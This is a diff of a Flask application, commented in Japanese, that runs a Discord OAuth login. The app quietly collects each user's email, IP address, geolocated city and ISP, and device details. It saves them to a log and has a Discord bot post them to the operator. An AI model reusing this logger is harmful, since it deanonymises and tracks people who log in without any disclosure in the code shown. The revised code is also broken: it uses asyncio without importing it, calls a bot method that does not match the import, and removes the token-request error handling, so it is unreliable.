@@ -1,14 +1,12 @@
-# main.py
 import os
-import time
-import threading
 import json
+import threading
 import requests
-from flask import Flask, request, render_template
-from dotenv import load_dotenv
 from datetime import datetime
+from flask import Flask, request, render_template
+from discord_bot import bot, enqueue_task
 from user_agents import parse
-from discord_bot import bot  # 先ほど作った discord_bot.py をインポート
+from dotenv import load_dotenv
 
 load_dotenv()
 app = Flask(__name__)
@@ -16,8 +14,7 @@ ACCESS_LOG_FILE = "access_log.json"
 
 DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
-DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
-REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
+DISCORD_REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
 
 
 def get_client_ip():
@@ -47,21 +44,13 @@ def get_geo_info(ip):
         }
     except:
         return {
-            "ip": ip,
-            "country": "不明",
-            "region": "不明",
-            "city": "不明",
-            "zip": "不明",
-            "isp": "不明",
-            "as": "不明",
-            "lat": None,
-            "lon": None,
-            "proxy": False,
-            "hosting": False,
+            "ip": ip, "country": "不明", "region": "不明",
+            "city": "不明", "zip": "不明", "isp": "不明", "as": "不明",
+            "lat": None, "lon": None, "proxy": False, "hosting": False
         }
 
 
-def save_log(discord_id, structured_data):
+def save_log(discord_id, data):
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     if os.path.exists(ACCESS_LOG_FILE):
         with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
@@ -72,8 +61,8 @@ def save_log(discord_id, structured_data):
     if discord_id not in logs:
         logs[discord_id] = {"history": []}
 
-    structured_data["timestamp"] = now
-    logs[discord_id]["history"].append(structured_data)
+    data["timestamp"] = now
+    logs[discord_id]["history"].append(data)
 
     with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
         json.dump(logs, f, indent=4, ensure_ascii=False)
@@ -83,7 +72,7 @@ def save_log(discord_id, structured_data):
 def index():
     discord_auth_url = (
         f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
-        f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
+        f"&redirect_uri={DISCORD_REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
     )
     return render_template("index.html", discord_auth_url=discord_auth_url)
 
@@ -95,24 +84,17 @@ def callback():
         return "コードがありません", 400
 
     # Discord OAuth2 トークン取得
-    token_url = "https://discord.com/api/oauth2/token"
-    headers = {"Content-Type": "application/x-www-form-urlencoded"}
     data = {
         "client_id": DISCORD_CLIENT_ID,
         "client_secret": DISCORD_CLIENT_SECRET,
         "grant_type": "authorization_code",
         "code": code,
-        "redirect_uri": REDIRECT_URI,
+        "redirect_uri": DISCORD_REDIRECT_URI,
         "scope": "identify email guilds connections",
     }
-
-    try:
-        res = requests.post(token_url, data=data, headers=headers)
-        res.raise_for_status()
-        token = res.json()
-    except requests.exceptions.RequestException as e:
-        return f"トークン取得エラー: {e}", 500
-
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    res = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
+    token = res.json()
     access_token = token.get("access_token")
     if not access_token:
         return "アクセストークン取得失敗", 400
@@ -120,106 +102,43 @@ def callback():
     headers_auth = {"Authorization": f"Bearer {access_token}"}
     user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()
 
-    # IP取得
     ip = get_client_ip()
-    if ip.startswith(("127.", "10.", "192.", "172.")):
-        ip = requests.get("https://api.ipify.org").text
     geo = get_geo_info(ip)
+    ua = parse(request.headers.get("User-Agent", ""))
 
-    # User-Agent
-    ua_raw = request.headers.get("User-Agent", "不明")
-    ua = parse(ua_raw)
-
-    avatar_url = (
-        f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024"
-        if user.get("avatar")
-        else "https://cdn.discordapp.com/embed/avatars/0.png"
-    )
-
-    structured_data = {
-        "discord": {
-            "username": user.get("username"),
-            "discriminator": user.get("discriminator"),
-            "id": user.get("id"),
-            "email": user.get("email"),
-            "avatar_url": avatar_url,
-            "locale": user.get("locale"),
-            "premium_type": user.get("premium_type"),
-        },
-        "ip_info": geo,
-        "user_agent": {
-            "raw": ua_raw,
-            "os": ua.os.family,
-            "browser": ua.browser.family,
-            "device": "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Other",
-            "is_bot": ua.is_bot,
-        },
+    log_data = {
+        "username": f"{user.get('username')}#{user.get('discriminator')}",
+        "email": user.get("email"),
+        "ip": geo["ip"],
+        "region": geo["region"],
+        "city": geo["city"],
+        "isp": geo["isp"],
+        "proxy": geo["proxy"],
+        "browser": f"{ua.browser.family} {ua.browser.version_string}",
+        "os": f"{ua.os.family} {ua.os.version_string}",
+        "device": ua.device.family
     }
 
-    save_log(user["id"], structured_data)
+    save_log(user.get("id"), log_data)
 
-    # --- Bot タスク投入前に準備完了を待つ ---
-    wait_count = 0
-    while not bot.is_ready() and wait_count < 20:
-        time.sleep(1)
-        wait_count += 1
+    # Botにタスク送信
+    bot.enqueue_task(embed_data={"title": "新規アクセス", "description": f"{log_data}"}, user_id=user.get("id"))
 
-    d = structured_data["discord"]
-    ip_data = structured_data["ip_info"]
-    ua_data = structured_data["user_agent"]
-
-    embed_data = {
-        "title": "✅ 新しいアクセスログ",
-        "description": (
-            f"**名前:** {d['username']}#{d['discriminator']}\n"
-            f"**ID:** {d['id']}\n"
-            f"**メール:** {d['email']}\n"
-            f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n"
-            f"**IP:** {ip_data['ip']} / Proxy: {ip_data['proxy']} / Hosting: {ip_data['hosting']}\n"
-            f"**国:** {ip_data['country']} / {ip_data['region']} / {ip_data['city']} / {ip_data['zip']}\n"
-            f"**ISP:** {ip_data['isp']} / AS: {ip_data['as']}\n"
-            f"**UA:** {ua_data['raw']}\n"
-            f"**OS:** {ua_data['os']} / ブラウザ: {ua_data['browser']}\n"
-            f"**デバイス:** {ua_data['device']} / Bot判定: {ua_data['is_bot']}\n"
-            f"📍 [地図リンク](https://www.google.com/maps?q={ip_data['lat']},{ip_data['lon']})"
-        ),
-        "thumbnail": {"url": d["avatar_url"]},
-    }
-
-    bot.enqueue_task(embed_data=embed_data, user_id=d["id"])
-
-    # 不審アクセス
-    if ip_data["proxy"] or ip_data["hosting"]:
-        warn_embed = {
-            "title": "⚠️ 不審なアクセス検出",
-            "description": (
-                f"{d['username']}#{d['discriminator']} (ID: {d['id']})\n"
-                f"IP: {ip_data['ip']} / Proxy: {ip_data['proxy']} / Hosting: {ip_data['hosting']}"
-            ),
-        }
-        bot.enqueue_task(embed_data=warn_embed)
-
-    return render_template("welcome.html", username=d["username"], discriminator=d["discriminator"])
+    return render_template("welcome.html", username=log_data["username"])
 
 
-@app.route("/logs")
-def show_logs():
-    if os.path.exists(ACCESS_LOG_FILE):
-        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
-            logs = json.load(f)
-    else:
-        logs = {}
-    return render_template("logs.html", logs=logs)
+# =====================
+# Flask 起動前に Bot スレッドを立ち上げる
+# =====================
+def start_bot_thread():
+    def run_bot():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        bot.run(os.getenv("DISCORD_BOT_TOKEN"))
 
-
-# Discord Bot をスレッドで起動
-def run_bot():
-    import asyncio
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    bot.run(os.getenv("DISCORD_BOT_TOKEN"))
+    threading.Thread(target=run_bot, daemon=True).start()
 
 
 if __name__ == "__main__":
-    threading.Thread(target=run_bot, daemon=True).start()
-    print("Discord Bot is running. Flask app should be started with Gunicorn.")
+    start_bot_thread()
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
